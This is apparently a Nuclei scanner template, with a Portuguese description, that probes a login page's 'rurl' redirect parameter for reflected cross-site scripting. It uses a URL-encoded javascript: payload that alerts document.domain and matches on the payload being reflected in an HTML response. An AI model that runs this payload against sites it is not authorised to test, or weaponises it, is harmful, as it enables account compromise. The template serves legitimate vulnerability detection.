id: kaue-xss-rurl

info:
  name: kauexssrurl
  author: kauenavarro
  severity: medium
  description: Procura por respostas refletidas.
  tags: xss
requests:
  - method: GET
    path:
      - "{{BaseURL}}/account/login?rurl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain"
    
    redirects: true
    max-redirects: 1
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain"
        part: body
        condition: or

      - type: word
        words:
          - "text/html"
        part: header

      - type: word
        words:
          - "<title>Access Denied</title>"
          - "You don't have permission to access"
        part: body
        condition: and
        negative: true

      - type: status
        status:
          - 200
